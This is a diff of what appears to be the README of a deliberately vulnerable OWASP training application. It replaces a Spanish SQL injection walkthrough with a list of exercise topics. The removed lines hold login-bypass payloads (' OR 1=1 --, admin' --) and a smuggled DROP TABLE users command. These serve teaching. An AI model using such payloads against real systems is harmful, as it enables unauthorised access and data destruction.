@@ -1,17 +1,8 @@
-#Inyección SQL
-##El login page es vulnerable a ataques de inyección SQL
-Probar los siguientes ejemplos:
-###A. Esto iniciará sesión con la primer cuenta en la tabla users
-    username: ' OR 1=1 --
-    password: lo que sea
-    SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'anything'
-###B. Checar directamente si existe una cuenta admin
-    usename: admin' --
-    password: (blank)
-    SELECT * FROM users WHERE username = 'admin' -- ' AND password = ''
-###C. Eliminar la tabla usuarios (si se prueba, reiniciar la aplicación)
-    Username: admin'; DROP TABLE users; --
-    Password: (leave blank)
-    SELECT * FROM users WHERE username = 'admin'; DROP TABLE users; -- ' AND password = ''
-###* La solución hace que los inputs (username, password), sean tratados como inputs y no como código SQL directamente *
+Some exercises to show some of the OWASP's top ten vulnerabilities
+1. SQL Injection
+2. Bad Authentication
+3. Missing Sessions
+4. Command Injection
+5. Passwords
+6. Criptographic
 
